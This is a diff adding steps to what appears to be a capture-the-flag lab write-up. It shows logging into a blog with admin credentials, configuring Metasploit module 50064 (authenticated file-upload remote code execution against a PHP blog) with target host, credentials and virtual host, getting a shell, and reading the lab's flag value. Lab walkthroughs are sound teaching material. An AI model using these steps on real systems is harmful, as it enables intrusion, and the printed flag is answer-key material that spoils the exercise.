@@ -274,9 +274,37 @@ First go to
 
         Password: admin123!@#
 
-Once we've logged in, theres a form to POST data thats waiting for us to exploit it.
+Once we've logged in, there's a form to POST data thats waiting for us to exploit it.
 
+- Also, if we look at Slade Wilson's last post, he seems to have found a vulenerabiliy in the blog, 50064.
 
+  - This is a Remote Code Execution (RCE) exploit that targets authenticated file upload vulnerabilities found in PHP blogs.
+
+Well find it on our system with:
+
+      locate 50064
+      ...
+      /usr/share/metasploit-framework/modules/exploits/50064.rb
+
+Next, well copy it:
+
+      cp /usr/share/metasploit-framework/modules/exploits/50064.rb 50064.rb
+
+Let's start metasploit, and use the script we just copied:
+
+      use 50064.rb
+
+- Now we can configure the script:
+      
+      set RHOSTS 172.16.1.12
+      set USERNAME admin
+      set PASSWORD admin123!@#
+      set VHOST blog.inlanefreight.local
+
+And if we run it, we can get our shell, from there the flag is easy to find:
+
+      cat /customscripts/flag.txt
+      B1nD_Shells_r_cool
 
 
 
